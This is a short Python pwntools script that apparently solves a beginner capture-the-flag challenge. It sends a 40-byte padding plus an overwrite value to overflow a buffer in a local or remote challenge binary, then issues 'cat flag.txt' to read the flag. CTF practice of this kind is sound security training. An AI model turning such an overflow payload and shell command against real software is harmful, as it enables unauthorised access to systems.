#!/usr/bin/env python3
import pwn
import sys

host = "mc.ax"
port = 31199
target = "beginner-generic-pwn-number-0" 

def exploit(remote=False):
    if remote:
        pr = pwn.connect(host, port)
    else:
        pr = pwn.process(target)

    try:
        pr.readline()
        pr.readline()
        pr.readline()
        payload = b'\x90'* 40 + pwn.p64(0xffffffffffffffff)
        pr.sendline(payload)
        pr.sendline("cat flag.txt")
        print(pr.readall(2))
    finally:
        pr.close()

remote = False
if len(sys.argv) > 1 and sys.argv[1] == 'remote':
    remote = True
exploit(remote)
